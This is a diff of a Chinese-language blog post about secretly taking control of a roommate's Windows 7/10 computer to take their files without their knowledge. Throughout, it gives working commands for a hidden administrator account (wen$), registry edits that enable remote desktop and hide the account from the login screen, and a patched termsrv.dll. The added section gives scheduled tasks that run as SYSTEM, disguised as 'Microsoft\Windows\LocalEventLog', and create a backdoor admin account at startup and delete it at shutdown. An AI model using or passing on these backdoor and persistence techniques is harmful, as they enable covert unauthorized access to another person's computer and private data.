@@ -17,7 +17,7 @@
     <meta name="description" content>
     <meta name="author" content="Crazy-wen">
     <meta name="keywords" content>
-    <title>渗透室友的windows ~ Crazy-wen&#39;s Blog</title>
+    <title>在室友的windows维权 ~ Crazy-wen&#39;s Blog</title>
     <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
     <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
     <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
@@ -118,7 +118,12 @@ _hmt.push(['_setPageTag', id, value]);
                 <div class="py-5 z-depth-3 board">
                     <div class="post-content mx-auto">
                         <div class="markdown-body">
-                            <p>&emsp;&emsp;有一天，你突然想获取你室友电脑上的重要资料，又不想让你室友知道，并在以后也能轻松获取，那怎么办呢？找机会查看他的账户密码？这貌似不太可能，因为windows的密码是经过散列加密的，这种加密技术在技术上来说是不可逆的。在windows 9X时代，由于技术的不完善，用户可以通过某些方式跳过密码登录，抑或删除密码。但是后续的windows均进行了更新，致使无法破解抑或查看密码。<br>虽然还有诸多办法，但是我认为的还是<strong>取得他的电脑权限</strong>，因此我们可以找机会在他的电脑上进行操作，取得权限并维权，开启FTP服务，获取其电脑上的资料。<br>接下来，我要用三种方法实现对室友主机的渗透并维权</p>
+                            <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>有一天，我突然想获取你室友电脑上的重要资料，又不想让你室友知道，并在以后也能轻松获取，那怎么办呢？找机会查看他的账户密码？这貌似不太可能，因为windows的密码是经过散列加密的，这种加密技术在技术上来说是不可逆的。在windows 9X时代，由于技术的不完善，用户可以通过某些方式跳过密码登录，抑或删除密码。但是后续的windows均进行了更新，致使无法破解抑或查看密码。</p>
+</blockquote>
+<blockquote>
+<p>虽然还有诸多办法，但是我认为的还是<strong>取得他的电脑权限</strong>，因此我们可以找机会在他的电脑上进行操作，取得权限并维权，开启FTP服务，获取其电脑上的资料。<br>接下来，我要用三种方法实现对室友主机的渗透并维权</p>
+</blockquote>
 <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><pre><code>Windows 7(被控主机)
 Windows 10</code></pre><h1 id="方法一：创建用户并且在开机时不显示"><a href="#方法一：创建用户并且在开机时不显示" class="headerlink" title="方法一：创建用户并且在开机时不显示"></a>方法一：创建用户并且在开机时不显示</h1><h2 id="win7："><a href="#win7：" class="headerlink" title="win7："></a>win7：</h2><h3 id="创建隐藏的超级用户"><a href="#创建隐藏的超级用户" class="headerlink" title="创建隐藏的超级用户"></a>创建隐藏的超级用户</h3><p>以管理员身份运行命令行</p>
 <pre><code>net user wen$ wen /add   
@@ -137,7 +142,10 @@ reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot
 </blockquote>
 <h3 id="尝试第一次连接"><a href="#尝试第一次连接" class="headerlink" title="尝试第一次连接"></a>尝试第一次连接</h3><p><a href="https://imgchr.com/i/nQ1T29" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1T29.md.png" alt="nQ1T29.md.png"></a><br>&emsp;&emsp;在尝试第一次，发现win10主机连接时，所登陆的用户是administrator的，但同时，win7上的用户也被注销，出现用户登录界面，<strong>这显然很容易被发现</strong>，后来又换了普通用户尝试了几次，结果是一样的，得出结论，<strong>这台计算机只允许一个用户登陆</strong>，因此，下一步是让<strong>多个用户同时登陆</strong></p>
 <p>&emsp;&emsp;运行-&gt;gpedit，打开组策略编辑器，依次展开计算机配置—&gt;管理模板—&gt;Windows组件—&gt;远程桌面服务—&gt;远程桌面会话主机—&gt;连接—&gt;<strong>限制连接的数量，打开限制连接数</strong>，这里未配置时，默认的最大连接数是1.<strong>点击已启用—&gt;允许的RD最大连接数为该为2—&gt;确定</strong>，打开“<strong>远程桌面服务用户限制到单独的远程桌面服务会话</strong>”，<strong>点击已禁用，</strong><br><a href="https://imgchr.com/i/nQ1hUU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1hUU.md.png" alt="nQ1hUU.md.png"></a><br><a href="https://imgchr.com/i/nQ1fET" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1fET.md.png" alt="nQ1fET.md.png"></a></p>
-<p>&emsp;&emsp;下载一个universal termsrv.dll patch。（<strong>破解远程桌面多用户同时连接数限制</strong>）<br><a href="https://imgchr.com/i/nQ1RbV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1RbV.md.png" alt="nQ1RbV.md.png"></a></p>
+<blockquote>
+<p>下载一个universal termsrv.dll patch。（<strong>破解远程桌面多用户同时连接数限制</strong>）</p>
+</blockquote>
+<p><a href="https://imgchr.com/i/nQ1RbV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1RbV.md.png" alt="nQ1RbV.md.png"></a></p>
 <p><strong><em>此时再进行远程桌面连接，发现可以多用户登陆！！！</em></strong></p>
 <h3 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h3><p>&emsp;&emsp;在后续尝试中，发现一个小BUG，远程连接过一次后，在被控主机切换用户时，会显示wen$已登陆，这样显然会被发现本机已经被渗透了。</p>
 <h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>&emsp;&emsp;在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList <strong>（若注册表中没有则自行创建）</strong>下新建DWORD值，名称为wen$,值为0隐藏，值为1显示。再次切换用户，登录界面已经没有隐藏用户。</p>
@@ -179,7 +187,137 @@ del %0</code></pre><blockquote>
 <p>替换注册表中的隐藏用户的F值</p>
 </blockquote>
 <p>&emsp;&emsp;虽然可以成功登陆，但是只能登陆一个用户，所以极易被发现，因此还需修改连接数<br>&emsp;&emsp;按照上述原理，修改组策略再运行破解软件就可以达到效果，实际上修改组策略就是修改注册表（不完全是），但是我在网上找了很久，还是不知道<strong>组策略中远程桌面连接服务对应注册表</strong>中的资料，所以暂时先放一放。</p>
-<h1 id="方法二：以开关机为触发时间的计划任务创建删除用户"><a href="#方法二：以开关机为触发时间的计划任务创建删除用户" class="headerlink" title="方法二：以开关机为触发时间的计划任务创建删除用户"></a>方法二：以开关机为触发时间的计划任务创建删除用户</h1><h1 id="方法三：小马拉大马"><a href="#方法三：小马拉大马" class="headerlink" title="方法三：小马拉大马"></a>方法三：小马拉大马</h1>
+<h3 id="在win20中运行-bat"><a href="#在win20中运行-bat" class="headerlink" title="在win20中运行.bat"></a>在win20中运行.bat</h3><blockquote>
+<p>实验发现，在win10中运行.bat爷爷已达到同样的效果，</p>
+</blockquote>
+<p><a href="https://imgchr.com/i/n8UZkj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/08/n8UZkj.md.png" alt="n8UZkj.md.png"></a></p>
+<blockquote>
+<p>但是在win10中破解多个用户登陆与win7有差别，主要有两种方法：</p>
+</blockquote>
+<ul>
+<li><p>远程桌面多用户登陆补丁,将termsrv.dll文件替换c:\windows\system32\下的同名文件即可<br><a href="https://imgchr.com/i/nGSFYV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/08/nGSFYV.md.png" alt="nGSFYV.md.png"></a></p>
+</li>
+<li><p>使用win10的远程桌面多用户登陆破解软件</p>
+</li>
+</ul>
+<h1 id="方法二：以开关机为触发时间的计划任务创建删除用户"><a href="#方法二：以开关机为触发时间的计划任务创建删除用户" class="headerlink" title="方法二：以开关机为触发时间的计划任务创建删除用户"></a>方法二：以开关机为触发时间的计划任务创建删除用户</h1><blockquote>
+<p>计划任务面板可以在cmd中输入taskschd打开，在命令中可以使用schtasks命令创建计划任务</p>
+</blockquote>
+<blockquote>
+<p>描述:<br>允许管理员在本地或远程系统上创建计划任务。</p>
+</blockquote>
+<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><pre><code>/U   username      指定应在其中执行 SchTasks.exe 的用户上下文。
+
+/P   [password]    指定给定用户上下文的密码。如果省略则提示输入。
+
+/RU  username      指定任务在其下运行的“运行方式”用户帐户(用户上下文)。
+                   对于系统帐户，有效值是 &quot;&quot;、&quot;NT AUTHORITY\SYSTEM&quot; 或&quot;SYSTEM&quot;。
+                   对于 v2 任务，&quot;NT AUTHORITY\LOCALSERVICE&quot;和
+                   &quot;NT AUTHORITY\NETWORKSERVICE&quot;以及常见的 SID。对这三个也都可用。
+
+/RP  [password]    指定“运行方式”用户的密码。要提示输入密码，值必须是 &quot;*&quot; 或无。
+                   系统帐户会忽略该密码。必须和 /RU 或 /XML 开关一起使用。
+
+/RU/XML  /SC  schedule     指定计划频率。
+                   有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、
+                   MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.
+
+/MO   modifier     改进计划类型以允许更好地控制计划重复
+                   周期。有效值列于下面“修改者”部分中。
+
+/D    days         指定该周内运行任务的日期。有效值:
+                   MON、TUE、WED、THU、FRI、SAT、SUN
+                   和对 MONTHLY 计划的 1 - 31
+                   (某月中的日期)。通配符“*”指定所有日期。
+
+/M    months       指定一年内的某月。默认是该月的第一天。
+                   有效值: JAN、FEB、MAR、APR、MAY、JUN、
+                   JUL、 AUG、SEP、OCT、NOV  和 DEC。通配符
+                   “*” 指定所有的月。
+
+/I    idletime     指定运行一个已计划的 ONIDLE 任务之前
+                   要等待的空闲时间。
+                   有效值范围: 1 到 999 分钟。
+
+/TN   taskname     指定唯一识别这个计划任务的名称。
+
+/TR   taskrun      指定在这个计划时间运行的程序的路径
+                   和文件名。
+                   例如: C:\windows\system32\calc.exe
+
+/ST   starttime    指定运行任务的开始时间。
+                   时间格式为 HH:mm (24 小时时间)，例如 14:30 表示
+                   2:30 PM。如果未指定 /ST，则默认值为
+                   当前时间。/SC ONCE 必需有此选项。
+
+/RI   interval     用分钟指定重复间隔。这不适用于
+                   计划类型: MINUTE、HOURLY、
+                   ONSTART, ONLOGON, ONIDLE, ONEVENT.
+                   有效范围: 1 - 599940 分钟。
+                   如果已指定 /ET 或 /DU，则其默认值为
+                   10 分钟。
+
+/ET   endtime      指定运行任务的结束时间。
+                   时间格式为 HH:mm (24 小时时间)，例如，14:50 表示 2:50 PM。
+                   这不适用于计划类型: ONSTART、
+                   ONLOGON, ONIDLE, ONEVENT.
+
+/DU   duration     指定运行任务的持续时间。
+                   时间格式为 HH:mm。这不适用于 /ET 和
+                   计划类型: ONSTART, ONLOGON, ONIDLE, ONEVENT.
+                   对于 /V1 任务，如果已指定 /RI，则持续时间默认值为
+                   1 小时。
+
+/K                 在结束时间或持续时间终止任务。
+                   这不适用于计划类型: ONSTART、
+                   ONLOGON, ONIDLE, ONEVENT.
+                   必须指定 /ET 或 /DU。
+
+/SD   startdate    指定运行任务的第一个日期。
+                   格式为 yyyy/mm/dd。默认值为
+                   当前日期。这不适用于计划类型: ONCE、
+                   ONSTART, ONLOGON, ONIDLE, ONEVENT.
+
+/ED   enddate      指定此任务运行的最后一天的日期。
+                   格式是 yyyy/mm/dd。这不适用于计划类型:
+                    ONCE、ONSTART、ONLOGON、ONIDLE。
+
+/EC   ChannelName  为 OnEvent 触发器指定事件通道。
+
+/IT                仅有在 /RU 用户当前已登录且
+                   作业正在运行时才可以交互式运行任务。
+                   此任务只有在用户已登录的情况下才运行。
+
+/NP                不储存任何密码。任务以给定用户的身份
+                   非交互的方式运行。只有本地资源可用。
+
+/Z                 标记在最终运行完任务后删除任务。
+
+/XML  xmlfile      从文件的指定任务 XML 中创建任务。
+                   可以组合使用 /RU 和 /RP 开关，或者在任务 XML 已包含
+                   主体时单独使用 /RP。
+
+/V1                创建 Vista 以前的平台可以看见的任务。
+                   不兼容 /XML。
+
+/F                 如果指定的任务已经存在，则强制创建
+                   任务并抑制警告。
+
+/RL   level        为作业设置运行级别。有效值为
+                   LIMITED 和 HIGHEST。默认值为 LIMITED。
+
+/DELAY delaytime   指定触发触发器后延迟任务运行的
+                   等待时间。时间格式为
+                   mmmm:ss。此选项仅对计划类型
+                   ONSTART, ONLOGON, ONEVENT.
+
+/?                 显示帮助消息。</code></pre><h4 id="设置开机创建用户"><a href="#设置开机创建用户" class="headerlink" title="设置开机创建用户"></a>设置开机创建用户</h4><blockquote>
+<p>schtasks /create /tn “Microsoft\Windows\LocalEventLog” /tr “&quot;cmd.exe&quot; /k net user test$ 123456 /add /y /active:yes &gt;&gt; nul &amp; net localgroup administrators test$ /add &gt; nul &amp; net user test$ /comment:&quot;Built-in account for Backdooring your network suckers&quot; &gt; nul &amp; exit” /f /ru system /sc onstart</p>
+</blockquote>
+<h4 id="设置关机删除用户"><a href="#设置关机删除用户" class="headerlink" title="设置关机删除用户"></a>设置关机删除用户</h4><blockquote>
+<p>schtasks /create /tn “Microsoft\Windows\LocalEventLog” /tr “&quot;cmd.exe&quot; /k net user test$ /del &gt; nul &amp; exit” /f /ru system /sc onevent /ec System /mo “*[System[EventID=1074]]”</p>
+</blockquote>
+
                             <hr>
                         </div>
                         <br>
@@ -278,7 +416,7 @@ del %0</code></pre><blockquote>
         var typed = new Typed('#subtitle', {
           strings: [
             '  ',
-            "渗透室友的windows&nbsp;",
+            "在室友的windows维权&nbsp;",
         ],
         cursorChar: "_",
         typeSpeed: 70,
